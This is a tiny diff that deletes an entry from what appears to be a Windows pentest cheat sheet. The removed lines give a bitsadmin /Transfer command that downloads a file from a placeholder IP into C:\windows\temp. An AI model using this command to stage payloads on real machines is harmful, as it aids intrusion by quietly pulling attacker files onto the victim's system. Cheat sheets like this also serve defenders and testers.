@@ -1,4 +1,0 @@
- % windows, certutil
-
-# Download file with bitsadmin
-bitsadmin /Transfer myJob http://<ip>/<file|file.txt> <path|C:\windows\temp> 
